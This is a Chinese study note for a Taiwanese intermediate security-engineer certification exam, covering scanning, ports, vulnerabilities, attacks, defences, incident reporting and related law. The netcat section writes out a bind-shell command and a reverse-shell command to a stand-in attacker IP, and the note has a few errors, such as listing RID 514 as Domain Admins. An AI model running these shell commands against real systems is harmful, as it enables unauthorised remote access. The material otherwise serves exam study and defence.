# iPAS-資安工程師中級
該筆記包含中級會考的技術 & 管理

But 技術部份吃經驗，所以沒有寫太多細節，不清楚的最好去摸一摸工具、指令，或是看更詳細的教材




# 技術
## 掃描
掃描大概分為三類型：
- 網路架構掃描
- 通訊埠掃描
- 弱點掃描

TCP 掃描 :
與全連接掃描比起，半連接掃描進行連線的紀錄較少，速度也
比較快。安全機制不嚴謹的主機，不容易留下掃描技術

UDP 掃描 :
UDP Scan 與 TCP Scan 比較費時，且精準度也較低

### 常見的網路掃描工具  
- Nmap
- Saint
- ISS
- Cybercop Scanner

dmitry 是收集工具，可以收集指定的網域中的子網域，E-mail ，伺服器服務類型，port 掃描，whois 等


Nmap OS 判斷方法 :
- TCP FIN flag 偵測
送不包含 ACK 或 SYN 旗標的封包，給目標端開啟的 port，等待封包的回應時間
- BOGUS flag 偵測
在 SYN 封包的 TCP 標頭中設定一個未定義的 TCP 旗標，
Linux2.0.35 版之前的舊版本會在回應封包中保持這個旗標，而其他類型作業系統則收到 SYN+BOGUS 封包後，將目前的連線中斷，然後再重新連線
- TCP ISN Sampling
利用多發幾次連接找 ISN 變化的特徵
- ICMP Error Message Quenching
對目標伺服器發送一連串封包，統計出一段時間內收到的 ICMP
unreachable 封包，再與作業系統的預設值做比較，即可辨認出作業系統類型與版本


ISN 補充
ISN(Initial Sequence Number) 初始序列號碼 :
在 TCP 中，每個傳送的位元組都要有一個 序號 (Sequence Number)，用來確認資料的順序、防重送等等問題

- ISN = TCP 起始序號
- 位置 = TCP Header 的 Sequence Number 欄位
- 所在層 = OSI 第 4 層 (傳輸層)

TCP 連線：
Client → Server：送出 SYN 封包，並帶一個初始序號。
Server → Client：回應 SYN+ACK 封包，其中包含 Server 的初始序號 (ISN)。
Client → Server：送 ACK 確認，連線建立

ISN 的產生方式 不同：
有些 OS 使用固定遞增演算法（例如每幾微秒加多少）。
有些 OS 使用隨機數生成器。
有些 OS 是時間導向（依照系統時鐘生成）。
ex :
- Linux 某版本：ISN = 以時間為基準，線性遞增。
- Windows 某版本：ISN = 使用 PRNG，但有特定週期。
- BSD 系統：可能使用更強的隨機化。


### NMAP

nmap 的 -f 與 --mtu 跟封包切分有關
- -sn 
Ping Scan (no port scan) → 只檢查哪些主機存活，不掃 port
- -f
把原本的掃描封包切成 8 bytes 的小片段（因為 IP fragment 必須是 8 bytes 的倍數）。
- -f -f
表示更小的 fragment（例如 16 bytes 一片 → 再拆更細）。
- --mtu <val>
允許你指定 自訂的分片大小（必須是 8 的倍數）。
例如：`nmap --mtu 24 <target>` 將封包切成 24-byte 的片段傳送。
    
MTU 補充
MTU ( Maximum Transmission Unit）是 IP 封包的最大傳輸單元，如果封包比 MTU 大，就必須被分片（fragment）

    
| 掃描方式 | Nmap 參數 | 送出的封包 |  Nmap 判斷方式 | 特點 / 限制   |
| ----------------------- | ------- | --------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| **SYN Scan (半開掃描)**  | `-sS`   | SYN |  SYN/ACK → open<br>RST → closed | - 最常用<br>- 不完成三向交握，較隱匿<br>- 需要 raw socket 權限 (root/admin) |
| **Connect Scan (完整連線)** | `-sT`   | 透過 OS 的 connect() 呼叫  | 成功 → open<br>失敗 → closed | - 不需特殊權限<br>- 噪音大（會在服務端留下紀錄） |
| **FIN Scan**  | `-sF`   | FIN | 無回應 → open/filtered<br>RST → closed | - RFC 793 定義<br>- Windows 不支援 (總是回 RST)  |
| **NULL Scan**    | `-sN`   | 不設任何 TCP flag (全 0)   | 無回應 → open/filtered<br>RST → closed | - 偵測率低<br>- Windows 不支援 |
| **Xmas Scan**  | `-sX`   | FIN+PSH+URG (三旗同亮 🎄) | 無回應 → open/filtered<br>RST → closed | - 名稱來自「像聖誕樹」<br>- Windows 不支援 |
| **ACK Scan**   | `-sA`   | ACK   |  ICMP unreachable → filtered<br>RST → unfiltered | - 用來偵測防火牆規則，而非 port 狀態 |
| **Window Scan**   | `-sW`   | ACK |  window>0 → open<br>0 → closed  | - 依賴系統實作差異，較少用|
| **Maimon Scan**   | `-sM`   | FIN/ACK | 無回應 → open<br>RST → closed | - 特定系統才有效  |

    
### Netcat 基本參數

- -z → 掃描模式 (zero-I/O, 不傳資料，只測試 port 是否開)
- -u → 使用 UDP 而非 TCP
- -w <秒數> → timeout 時間 (連線/等待秒數)
- -i <秒數> → 傳送封包之間的間隔（flood 或 slow scan 時有用）
- -l → 監聽模式 (listen)
- -p <port> → 指定本地埠號 (listen 或 connect 時用)
- -e <程式> → 連線成功後執行程式（例如 /bin/sh → shell backdoor）
- -c <command> → 與 -e 類似，但允許直接指定命令
- -q <秒數> → 在 stdin EOF 之後延遲幾秒再關閉連線
- -k → 保持 listen 模式（多次接受連線，而不是接一次就退出）
- -r → 隨機化 port 掃描順序

ex :
- 單純連線 `nc -v example.com 80`
- 開在受害者環境，連上就 RCE `nc -l -p 4444 -e /bin/bash`
- reverse shell 連回駭客電腦 `nc attacker_ip 4444 -e /bin/bash`
    

## Port
- 20 ftp-data FTP 資料連接埠
- 21 ftp
- 25 smtp Simple Mail Transfer Protocol (SMTP)
- 53 domain 網域名稱服務（如 BIND）
- 110 pop3 郵局通訊協定第三版
- 123 ntp 網路時間協定 (NTP)
- 143 imap 網際網路訊息存取協定 (IMAP) // pop 進化版
- 161 snmp 簡易網路管理協定 (SNMP) // 網路設備管理常用
- 162 snmptrap SNMP 的 Traps // 設備回報給管理用
- 179 bgp 邊界閘道協定 // ISP 與 ISP 之間用
- 194 irc 網際網路聊天室 (IRC)
- *** 389 ldap 輕量級目錄存取協定 (LDAP) !!!!!!!
- *** 445 microsoft-ds 透過 TCP/IP 的 SMB !!!!!!!
- *** 636 ldaps 透過 SSL 的輕量級目錄存取協定 (LDAPS)
- 513/tcp login 遠端登入 (rlogin) // 現在比較常用 ssh
- *** 514/udp syslog UNIX 系統紀錄服務 // SIEM 常用來收 log
- 520/udp 路由資訊協定 (RIP)
- *** 1433/tcp  ms-sql-s (Microsoft SQL Server)
- *** 1812 radius Radius 撥接認證與帳務服務 // server
- 1813 radius-acct Radius Accounting
- 2049 nfs 網路檔案系統 (NFS)
- *** 3306 mysql MySQL 資料庫服務
- *** 3389 rdp 微軟遠端桌面連線


RADIUS 補充
RADIUS ( Remote Authentication Dial-In User Service )
- 用來提供認證 (Authentication)、授權 (Authorization)、帳務 (Accounting)，簡稱 AAA
    
ex : 管理使用者登入與資源使用，常用於：VPN、Wi-Fi 無線網路、遠端撥接 (Dial-in)、NAS
    

| 角色                    | 說明 |
| --------------------- | ------------------------------------------------------------------- |
| **RADIUS Client**     | 也叫 NAS（Network Access Server），是使用者連入的設備，例如 VPN server、Wi-Fi AP、路由器。 |
| **RADIUS Server**     | 真正處理 AAA 的伺服器，驗證使用者帳號、密碼、授權等。                                       |
| **User / End Device** | 使用者或裝置，像是手機、筆電、撥接終端。                                                |


## 弱點
### 弱點產生原因

- 設計階段 → 系統先天弱點
ex : 演算法太老、自己發明奇怪的連接方式
- 實作階段 → 程式漏洞
ex : 常見程式漏洞，像是 SQL 串接、可以 cmdi 的程式等等
- 操作階段 → 管理或設定失誤
ex : AD 亂開權限之類的
- 人性／習慣 → 使用者行為引起的風險

### Common Vulnerability Scoring System(CVSS) 

[ From ] : 美國國家基礎建設諮詢委員會 (NIAC)

- CVSS 使用數學方程式，來判定弱點的嚴重性及影響
- CVSSv3.1 以 3 個群組來進行判斷，分別是基本矩陣群 (Basemetric group)、暫時矩陣群 (Temporal metric group) 及環境矩陣群 (Environmental metric group)

主要是用基本矩陣群 (Basemetric group)算分就可以了


出到 CVSSv4.0 了
多了補充評估度量組 (Supplemental Metric Group) : 評估各種可能影響風險決策的外部因素
    
### Maltego 

是一套網路情報與偵察應用工具，可以清楚呈現網路環境中的威脅關係**圖像**平台
    ![image](https://hackmd.io/_uploads/BkryDJbFlg.png)

### 弱點處理流程
1. Discovery → 找出弱點
2. Prioritization → 判斷哪個資產重要、優先修補
3. Assessment → 評估風險嚴重性
4. Reporting → 提供明確報告與建議
5. Remediation → 採取修補行動
6. Verification → 驗證修補是否有效
![image](https://hackmd.io/_uploads/r1gaD1-Kgl.png)

## 分級補充

![image](https://hackmd.io/_uploads/SkXoCuQtxe.png)

### A 級

資訊系統或單位的重要性最高。

- 系統故障或資安事件可能對國家安全、公共利益或大量使用者造成重大影響。ex : 關鍵基礎設施
- 需要嚴格的資安管理、配置標準及持續維護。

### B 級

資訊系統或單位的重要性次於 A 級。

- 系統故障或資安事件可能造成中度影響，但不至於危及整體國家安全或公共利益。ex : 重要的電子系統
- 需要遵循標準資安措施，但可比 A 級稍微彈性。

### C 級

影響較小的系統或單位。可以採取基本資安措施。
    
### 政府單位 VS. 民間
- A、B 級公務機關 : 重要性較高，必須遵循政府公告的資安標準。
- A、B 級特定非公務機關 : 例如中央目的事業主管機關管理下的重要民間機構（特定非公務機關），資安要求可由主管機關視實際情況訂定。
    
### 事件分級
1. 第一級 : 不重要的系統被打，沒有很嚴重
2. 第二級 : 不重要的系統被打的很嚴重 or 核心業務資訊被打但沒有很嚴重
3. 第三級 : 核心業務被打得很嚴重 or 關鍵基礎設施被打沒很嚴重
4. 第四級 : 關鍵基礎設施被打得很嚴重
    
    
## GCB
政府組態基準 (Government Configuration Baseline)
- 用來做安全設定的規範 ex:密碼長度、複雜度等
- 台灣的 GCB 有編號 AKA TWGCB-ID
    ID 編號有四個部分
    - 第 1 層「TWGCB」為根節點
    - 第 2 層「GCB 類型」現分為 4 個節點，分別以 01 代表作業系統、02 瀏覽器、03 網通設備 及 04 應用程式
    - 第 3 層「產品識別碼」各自依照該 GCB 類型中 GCB 項目發布的時間順序，使用 001 999 的數字依序進行編號
    - 第 4 層「組態項目序號」各自依照該 GCB 項目中組態項目的項次順序，使用 0001 9999 數字依序進行編號代表各組態項目
![image](https://hackmd.io/_uploads/SkiMsy-Kgx.png)

### 組態掃描工具
Vulmap
- 說不定可以用來資安健檢
- 入侵的時候可以用，檢查別人的 GPO(Group Policy Object) 怎麼設的

## 郵件

使用協議為 SMTP
### SMTP
![image](https://hackmd.io/_uploads/S1lin1WKee.png)

    
### 郵件安全

郵件傳輸格式從 MIME 進化成 S/MIME
- MIME → 支援多媒體電子郵件的傳輸格式，內容只有 base64 encode
- S/MIME → MIME 的安全升級版，提供加密與簽章
- PEM / PGP / MOSS / DKIM / Forced Encryption → 各種不同加密、簽章與驗證方案
    
## HTTP
- HTTP/1.1 和 HTTP/2 主要是“HTTP-over-TCP”，而 HTTP/3是 QUIC(Quick UDP Internet Connections)
- 2018 年 IETF 的 QUIC Work Group 把 QUIC 重新命名為 HTTP/3
![image](https://hackmd.io/_uploads/BkaJJeZtex.png)
- 安全特性和優勢：
    - TLS 安全連接：使用 TLS 1.3 ，強制對所有發起連接進行加密
    - 前向保護(Perfect forward secrecy (PFS)：可以在用戶代理和服務器之間交換臨時私鑰時實現 PFS
    - 重送攻擊保護 (Replay attack protection)：QUIC Server 識別並
丟棄具有相同密鑰派生值和隨機數的任何重複請求
    - IP 欺騙保護 (IP spoofing protection):QUIC 支援交握期間的地址驗證，並需要簽名的地址證明，從而消除 IP 欺騙攻擊
    - SSL 降級預防：使用 TLS 1.3 可防止 TLS 降級攻擊
- 新問題 :
    - 0-RTT 恢復漏洞：重新發送初始封包時可能迫使 Server 相信請
求來自先前已知的客戶端。若 Token 洩露，可以解密用戶代理發
送的 0-RTT 通信
    - 連接 ID 操縱攻擊 (Connection ID manipulation attacks：在交換客戶端和服務器 Hello Message 的初始交握期間操縱連接 ID，
並可能會對 HTTP/3 Server 造成拒絕服務攻擊
    - UDP 放大攻擊 (UDP amplification attack)
    - QUIC 版本降級攻擊：版本協商封包用於協商用戶代理和服務器之間的 QUIC 版本。該功能可能允許攻擊者將版本降級到不安全的 QUIC 版本
    - 缺乏監控支援：網路設備（如反向/正向代理、負載平衡器、Web 應用程序防火牆和安全事件監控工具）並不完全支持 HTTP/3

    
## OWASP top 10
![image](https://hackmd.io/_uploads/HJStegbKex.png)
    
:::info
反序列化被合併到軟體及資料完整性失效 (Software and Data Integrity Failure)
:::
## CI/CD
    
### CI（持續整合, Continuous Integration）

團隊開發程式碼時，頻繁合併到主分支，系統自動進行 建置 (build) 和測試 (test)
- 目的：快速發現程式碼錯誤、確保系統穩定

### CD（持續交付/部署, Continuous Delivery / Deployment）
自動化部署到 測試或預備環境，人工審核後才進入正式環境

- 目的：快速、安全地把程式碼推向生產環境

### 流程
1. 程式碼提交 (Commit)
開發者把程式碼推送到 Git/GitHub 等版本控制系統
2. 自動建置 (Build)
系統自動編譯程式碼、產生可執行檔或容器映像檔
3. 自動化測試 (Test)
單元測試、整合測試、端到端測試，檢查程式碼是否符合需求
4. 打包與部署 (Package & Deploy)
封裝成 Docker 映像、或生成部署檔案
    - 持續交付 → 部署到測試/暫存環境
    -  持續部署 → 部署到生產環境
5. 監控與回饋 (Monitor & Feedback)
部署後監控系統運行狀況 當出現錯誤自動回報給開發團隊
    
## HTTPS
### SSL/TLS
![image](https://hackmd.io/_uploads/SkuBBlZtle.png)

現在主要用 TLS 1.3 喔
    
### 憑證四種更新方法

1. Certificate Revocation List(CRL)
要定期去下載 Certificate Revocation List(CRL) 憑證列表
2. 線上憑證狀態協定 (Online Certificate Status Protocol, OCSP)
3. OCSP-Staple
4. OCSP-Must-Staple


## IOT

物聯網架構包含三層分為四大組成元件，分別為聯網裝置 (Device)、閘道器 (Gateway)、物聯網平台 ( IoT Platform)，以及服務層 (Service Layer )
![image](https://hackmd.io/_uploads/BkT_DfGFle.png)

### OWASP top 10
    
1. 弱密碼、可猜測密碼，或固定式密碼值
2. 不安全的網路服務
設備運行了一些不需要或不安全的網絡服務
3. 不安全的生態介面
不安全的 Web、後端 API、雲或移動接口
4. 缺乏安全的更新機制
5. 使用不安全或已遭棄用的組件
6. 隱私保護不充分
存儲在設備資訊被不安全的、不當的、或未經授權的使用
7. 不安全的資料傳輸和儲存
    缺乏對生態系統中任何位置的敏感數據進行加密或訪問控制
8. 缺乏設備管理
9. 不安全的預設設定
設備或系統的預設設定不安全
10. 缺乏實體保護措施

## 攻擊
    
### 水坑 (Watering Hole) 攻擊
- 針對的目標多為特定的團體
- 攻擊者首先透過猜測或觀察，確認目標組織成員經常訪問的網站，然後入侵其中一個或多個，植入惡意軟體
- 最後達到感染目標組織中部分成員的目的
    
### DOS
- 頻寬消耗型
    - 像是 DNS/NTP 放大攻擊 → 本質是 DDoS 攻擊的一種，利用「小請求( 攻擊者 )  → 大回應( 像是 DNS/NTP 服務 )」+「來源 IP 偽造( 受害者 IP  )」，把大量流量灌到受害者，癱瘓網路頻寬。
    - UDP 泛洪
- 資源耗盡型
    - 像是 XXE 的放大攻擊，把 paser 的記憶體塞爆
    - TCP SYN flood 
- 攻擊名稱像是 :
    - UDP 泛洪攻擊
    - 死亡之 Ping 與 Ping 泛洪攻擊
        Pod 利用無法解析超大 ping 封包達成
    - Smurf 攻擊手法
    與 UDP Flood 類似，將 UDP 訊息取代為 ICMP echo request 封包
    - Teardrop Attack 淚滴攻擊
    發不正常的封包影響正常功能
    - LAND 攻擊
    把發送 IP 跟接收 IP 都寫受害者，無限迴圈
    
### 勒索
![image](https://hackmd.io/_uploads/Hkc_CMGFex.png)

### wifi
- Evil Twin : 偽造 Wi-Fi 熱點，騙使用戶連線
- Deauthentication Attack : 發送偽造 deauth 封包，迫使用戶斷開原本的網路

### 藍芽
- Bluejacking : 發垃圾訊息給其他人
- Bluesnarfing : 亂存取別人資料
- Bluebugging : RCE 藍芽設備
- Secure Simple Pairing Attacks : 亂跟別人配對
    
### 補充

IEEE 標準 : 802.3 (Ethernet)、802.11 (Wi-Fi)、802.15 (藍牙)
    
### 近期
**Crazy hunter**
攻擊者利用弱密碼入侵系統，部署 WebShell 或後門程式，並使用 SharpGPOAbuse 等工具透過群組原則物件（GPO）進行橫向移動。
    
## 防護
### data link 層
- Switch 屬於資料連結層，根據 MAC 位址來判斷封包要送去哪個埠
- 所有連在同一台 Switch 的設備，屬於同一個廣播領(Broadcast Domain)
- 可能發生廣播風暴 (Broadcast Storm)
- 可利用 VLAN(Virtual LAN) 解決
    
### FW( Firewall )
![image](https://hackmd.io/_uploads/H1MzMXzFlg.png)
分成軟體跟硬體版本 :
- 軟體
    彈性高(好更新)、便宜，但效能依賴主機資源，安全性沒有硬體好
- 硬體
    貴，但有專用硬體加速，防護效能更好

大部分防火牆內建 NAT 功能

防火牆建置分為三種類型：
- 防禦主機防火牆 (Bastion host firewall )
    把一台主機強化後當第一線防火牆
- 屏障式防火牆 (Screened host firewall )
    有一個強化主機防火牆 + 一個路由器過濾
- 屏障式子網路防火牆 (Screened subnet firewall )
    把強化主機防火牆放在 DMZ
    
![image](https://hackmd.io/_uploads/BysODmfYll.png)

- 虛擬修補
    - IPS 廠商透過一些政策和規則來防範由網路發動的漏洞攻擊。
    - 虛擬修補工作流程，包括以下階段：準備、識別、分析、虛擬修補建立、實施/測試與復原/追蹤。
    
聯絡窗口宜使用議定之資訊安全事件及事故分級尺度評鑑每一資訊安全事件，並決定是否將其歸類為資訊安全事故事故之分級及定優先序，有助於識別事故之衝擊及範圍
- 若組織具有資訊安全事故回應小組 (Information security incident response team, ISIRT)，事故可轉交 ISIRT 確認或重新評鑑
    
### 資安事件處理流程
訂定資通安全政策及目標，由副總經理以上主管核定，並定期檢視政策及目標且有效傳達員工其重要性。
    
6 步驟：準備 → 偵測 → 控制 → 根除 → 復原 → 檢討
    
證據蒐集流程 :
1. 識別 (Identification)：涉及搜尋、辨識並以文件記錄潛在證據程序
2. 蒐集 (Collection)：採集可能包含潛在證據之實體項目的程序
3. 獲取 (Acquisition)：所規定集合內產生一份資料複本之程序
4. 保存 (Preservation)：維持及保全潛在證據完整性及原始狀況的程序
    
### 通報
1. 初始通報 : 知悉事件後 1 小時內向主管機關指定對象通報
2. 等級審核	
    - 第 1、2 級事件 → 8 小時內 完成審核
    - 第 3、4 級事件 → 2 小時內 完成審核
3. 損害控制/復原	
    - 第 1、2 級事件 → 72 小時內 完成
    - 第 3、4 級事件 → 36 小時內 完成

### 備援
分為自動線上備援機制或離線備援機制
以下是資料儲存的架構 :
- DAS ( Direct Attached Storage )像是本機外接硬碟，但是無法在多台伺服器間共用，擴充性有限
- NAS 像網路共享資料夾（檔案層級），效能受網路頻寬限制。
- SAN ( Storage Area Network )像高速專網連接的「虛擬硬碟」（區塊層級），成本高，維護複雜。
- IP SAN = 走乙太網路的 SAN（便宜版 SAN），效能比 FC SAN 稍差，但比 NAS 好。
![image](https://hackmd.io/_uploads/BJT7lEftxe.png)
![image](https://hackmd.io/_uploads/SJzKlNGKlg.png)

### RAID
容錯式磁碟陣列 (Redundant Array of Independent Disks)
分成 5 種類型 :
1. RAID 0 : 沒有容錯的部分，分散寫進去就對了 (效能最佳，但無容錯)
2. RAID 1 : 全部複製一份，但是可以寫的空間剩一半 (容錯最佳，但成本高)
3. RAID 5 : 可以容忍一顆硬碟壞掉 (折衷方案，常見於企業)
4. RAID 6 : 可以容忍兩顆硬碟壞掉 (折衷方案，常見於企業)
5. RAID 10 : 結合 0 跟 1，用兩倍的硬體來複製備援資料 (效能與容錯兼具，但需要更多硬碟)
    
![image](https://hackmd.io/_uploads/rktVX4zKxe.png)
![image](https://hackmd.io/_uploads/BySH7Nztgg.png)

## 系統權限
Linux: UID=0 是單一 root 帳號代表最高權限
Windows : RID 500 是 admin
Windows : RID 501 是 Guest 不需要密碼
Windows : RID 502 是 KRBTGT，AD 驗證權限的
Windows : RID 512 是 Domain Admins
Windows : RID 513 是 Domain Users 一般使用者帳號
Windows : RID 514 是 Domain Admins
    

Windows SID 補充

SID ( Security Identifier )
`S-1-5-21-<Domain/Computer ID>-<Relative ID (RID)>`
- S	表示這是一個 SID（Security Identifier）
- 1	版本號（目前都是 1）
- 5	標識 NT Authority（即 Windows 內建的安全權限機構）
- 21 標識這個 SID 是域或電腦的唯一 ID
- <Domain/Computer ID>	每台電腦或網域都有一個唯一的數字序列，區分不同域或機器
- <RID>	Relative ID，指定這個帳號或群組在該域/電腦中的具體身份，例如：500 → Administrator


## 測試
    
### 軟體測試
會經過 4 個流程 :
1. 單元測試 (Unit test)：
執行結果是否合乎預期，通常是由程式設計師自己進行測試
2. 功能測試 (Function test)：
測試系統是否能符合預期的功能需求，通常由軟體品保工程師進行
3. 整合測試 (Integration Test)：
測試單元間能否相互合作完成某種服務需求。由程式設計師或軟體品保工程師進行
4. 驗收測試 (User Acceptance Test；UAT)：
使用者測試
    
### 黑白箱
白箱 : 方法有基本路徑測試 (Basis Path Testing)和資料流測試 (Data Flow Testing)
黑箱 : 考慮程式的輸出資料與對應輸入資料之間的正確性，基本上不考慮軟體內部的結構
    
## 各種顏色隊伍
![image](https://hackmd.io/_uploads/SkEnYEGFle.png)

## Cyber kill chain
    
1. 偵查 (Reconnaissance) : 研究、識別及選擇目標
2. 武裝 (Weaponization) : 針對目標設計一些惡意軟件
3. 傳遞 (Delivery) : 把惡意軟體想辦法送到受害者電腦
4. 弱點攻擊 (Exploitation) : 攻擊
5. 安裝 (Installation) : 裝後門
6. 命令與控制 (Command & Control): 穩定的 RCE
7. 採取行動 (Actions on Objectives) : 成功偷到內部資料之類的

### MITRE ATT&CK
| 策略階段 (Tactic)                           | 目標/簡介                                      |
| --------------------------------------- | ------------------------------------------ |
| **1. 初始存取 (Initial Access)**            | 攻擊者首次進入目標系統或網路，例如釣魚郵件、利用漏洞、遠端服務。           |
| **2. 執行 (Execution)**                   | 在受害系統上執行惡意程式或命令，獲取初步控制權。                   |
| **3. 永續性 (Persistence)**                | 攻擊者確保即使系統重啟或使用者登出，也能保持存取權限，例如安裝後門或修改啟動程序。  |
| **4. 權限提升 (Privilege Escalation)**      | 提高自身權限以獲取系統管理權限或更高的存取能力。                   |
| **5. 防禦繞過 (Defense Evasion)**           | 逃避防毒、防火牆或安全監控，例如隱藏檔案、加密惡意程式、清除日誌。          |
| **6. 資訊收集 (Credential Access)**         | 蒐集使用者帳號與密碼或其他憑證，以便進一步存取系統。                 |
| **7. 偵察 (Discovery)**                   | 收集系統、網路、用戶或環境資訊，例如列出網路資源、掃描開放端口。           |
| **8. 橫向移動 (Lateral Movement)**          | 從一台電腦移動到網路內其他系統，例如使用遠端桌面、Pass-the-Hash 攻擊。 |
| **9. 收集 (Collection)**                  | 收集有價值的資料，例如文件、通訊或敏感資訊。                     |
| **10. 指揮與控制 (Command and Control, C2)** | 與攻擊者控制端建立通訊，以傳送指令或接收竊取的資料。                 |
| **11. 外洩 (Exfiltration)**               | 將收集到的資料傳送到攻擊者控制的系統或外部網路。                   |
| **12. 影響 (Impact)**                     | 對目標系統或業務造成破壞或干擾，例如勒索軟體加密資料、系統破壞。           |
| **13. 憑證存取 (Credential Access)**        | 有些版本將這與資訊收集分開，專門針對取得憑證。                    |
| **14. 偵測回避 (Defense Evasion)**          | 繞過安全防護，部分版本將這與永續性分開強調技巧。                   |

## SSDLC
安全性軟體開發流程（Secure Software Development Lifecycle） 分成以下幾個階段
1. 需求分析（Requirements Analysis）: 定義功能與安全需求
2. 系統設計（Design） : 設計系統架構與安全架構
3. 開發/編碼（Implementation / Coding）
4. 測試（Testing / Verification） : 驗證功能與安全
5. 部署（Deployment / Release）: 系統上線
6. 維護與更新（Maintenance / Operation）
    
原碼檢測應該在 3 4 都會有

# 管理
資訊安全管理系統全名為 Information Security Management System (ISMS)

    
- 用於 : 評估資訊及其生命週期與作業過程之風險，藉由實作控制措來管控風險
- 維護資訊的機密性、完整性及可用性
- 包含 : 
    - 政策 (Policies)：高層管理層決定
    - 程序 (Procedures)
    - 指引 (Guidelines)：通常是建議
    - 相關資源 (Resources) 與活動 (Activities)
    
![image](https://hackmd.io/_uploads/BkIoXtmYee.png)
 

若符合以下任一條件，委託機關應自行或另行委託第三方進行安全性檢測：
1. 該系統屬核心資通系統
2. 委託金額達新臺幣一千萬元以上

## 相關資安法規
### 智慧財產權 IPR (Intellectual property right)
    賦予創作人專屬享有之權利包括著作權、商標權、專利與營業秘密
    
- 著作權 : 完成著作就有著作權，不需要申請與聲明
    But 工作中所開發完成的軟體程式，其著作權是屬於雇主
    - 著作人格權: 公開發表的權利，人死了就沒了
    - 著作財產權: 重製、表演、播送、散佈等權利，死後還有五十年
- 專利 (Patent) 法 : 自申請日起 20 年
    - 物之發明 : 寫 code 讓東西動起來
    - 方法發明 : 想一個演算法
- 營業秘密 (Trade secret) 法 : 能夠賺錢的技術或資訊
    構成營業秘密三要件 :
    - 大家不知道
    - 能賺錢
    - 私密性 ( 我不知道跟第一個差在哪

    犯法 : 處五年以下有期徒刑或拘役，得併科新臺幣 100 萬元以上 1000 萬元以下罰金

## 電子簽章 VS. 數位簽章
- 電子簽章 : 只要是可以分辨出擁有的方法都算
- 數位簽章 : 非對稱加密
    
## 個資
### 個資包含
姓名、出生年月日、身分證統一編號、特徵、指紋、婚姻、家庭、**教育**、職業、健康、病歷、**財務情況**、社會活動及其他足資識別該個人之資料
### 特種個資
病歷、醫療、基因、性生活、健康檢查及犯罪前科之個人資料
    
個資被洩漏 :
- 每人每一事件新臺幣 500 以上 20000 元以下計算
- 如果出大事最多被罰 2 億，如果被罰的賺超過就賺多少罰多少
    
違反告知義務 & 拒絕主管機關檢查者 :
- 每次可罰 2～20 萬元
    
### 歐盟 GDPR
資料保護規定 (General Data Protection
Regulation) 2018 年啟用
    

#### 一般個資: 識別當事人之任何資訊
包括: 透過網路 IP、瀏覽紀錄產生之數位軌跡
#### 特種個資: 
包括: 揭露人種、血統、政治意見、宗教、哲學信仰、工會身分、基因、生物特徵、健康相關、性生活與性傾向

#### GDPR 特色 :
- 明確當事人同意
     - 同意之撤回應與給予同意一樣容易
- 加重企業責任
     - 員工 250 人以上企業應保存維護相關紀錄
     - 出事要 72 小時內通報當地個資主管機關
     - 輕罰：1000 萬歐元或全球營業總額 2% 之行政罰
     - 重罰：2000 萬歐元或全球營業總額 4% 之行政罰
- 強化當事人權利
    - 更正權：當事人有權更正其不正確之個資
    - 被遺忘權：當事人可以請求刪除其個資或連結
    - 個資可攜權 : 我可以要求公司提供我寫的個資，傳給其他公司
    - 拒絕權：當事人應有權拒絕個人特徵之建檔行為
- 限制個資跨境傳輸
    - 預設個資不會出國
    
## 刑法_妨礙電腦使用罪
### 358  無故入侵電腦罪
行為包含 :
- 無故輸入他人帳號密碼
- 破解使用電腦之保護措施
- 利用電腦系統之漏洞入侵
    
刑罰 :
三年以下有期徒刑、拘役或科 or 併科 30 萬元以下罰金

###  360 無故干擾電腦系統罪
DOS 或是 EMP 別人可能都算八，破壞系統或設備運作穩定性
    
刑罰 :
三年以下有期徒刑、拘役或科或併科 30 萬元以下罰金。
    
### 359 無故取得、刪除或變更電磁記錄
行為包含 :
- 無故取得他人設備之電磁紀錄
- 刪除他人設備之電磁紀錄
- 變更他人設備之電磁紀錄
    
刑罰 :
五年以下有期徒刑、拘役或科或併科 60 萬元以下罰金

### 361 對公務機關犯罪之加重
只要中上面三個其中一個，刑罰 * 1.5
    
### 362 製作專供犯罪程式罪
寫病毒是犯罪喔 
> Offensive Security 開發 kali 罪孽深重喔
    
刑罰 : 五年以下有期徒刑、拘役或科或併科六十萬元以下罰金
> 跟上面偷資料罪一樣重
    
## 機關的各種複雜定義
    
公務機關應設置資通安全長，由機關首長指派 [from 資安法]
### 公務機關 : 不包括軍事機關及情報機關
### 特定非公務機關 : 
- 關鍵基礎設施提供者
- 公營事業
- 政府捐助之財團法人
### 關鍵基礎設施
對國家安全、社會公共利益、國民生活或經濟活動有重大影響的東西

### 不同級要做的事
![image](https://hackmd.io/_uploads/BJ7-kYmFge.png)
![image](https://hackmd.io/_uploads/S1h7yY7tgx.png)
![image](https://hackmd.io/_uploads/HkUByYXFxg.png)

![image](https://hackmd.io/_uploads/HkK-ltQKxl.png)
發生 3 4 級的事，資安長要開會
    
### 通報流程
[ From ] [HeyMrSalt](https://github.com/HeyMrSalt/iPAS-Specialist-Notes?tab=readme-ov-file#%E8%B3%87%E9%80%9A%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E9%80%9A%E5%A0%B1%E6%B5%81%E7%A8%8B)
![image](https://hackmd.io/_uploads/H1lpw6VKgx.png)

### 事情發生後
![image](https://hackmd.io/_uploads/HkR7_AEYle.png)

    
## 身分認證
- you know : 密碼、圖形等系統認證資訊
- you have : 手機、IC 卡
- you are : 指紋、虹膜
- you do : 手勢、語音識別、簽名
- Shomewhere you are : 基於位置的認證 ( 打卡 ?
    
### 生物認證
![image](https://hackmd.io/_uploads/ByMLGYQFxl.png)
- 錯誤拒絕率 (False Rejection Rate, FRR)：
原本合法的使用者在認證時卻被拒絕，稱為 Type I 錯誤
- 錯誤接受率 (False Acceptance Rate, FAR)：
非法使用者被認證為通過，稱為 Type II 錯誤
    
## SOC 報告形式
SOC（Service Organization Controls）報告是由美國會計師協會（AICPA） 所制定的一種內控與資訊安全相關的鑑證報告形式，有三種類型。

- SOC 1 : 針對 財務報告相關的內部控制（ICFR, Internal Control over Financial Reporting
- SOC 2 : 信任服務準則（Trust Services Criteria, TSC）Ex 安全性（Security）、可用性（Availability） 巴拉巴拉
- SOC 3 : 簡化過的 SOC 2，變成公開版本
    
## CTI 類型
- Strategic（戰略型）: 給老闆看的，一個大方向
- Tactical（戰術型） : SOC 分析師、資安工程師看的，要想辦法做偵測規則與安全策略。ex : MITRE 之類的
- Operational（操作型）: 威脅獵人（Threat Hunter）、事件響應（IR）團隊看的，預測敵方行動，指導資安行動。ex : 近期 ?APT 正針對O地區進行魚叉式攻擊
- Technical（技術型）: 像是惡意 IP、網域、URL、檔案雜湊值（MD5/SHA256）

## 資安管理的範圍
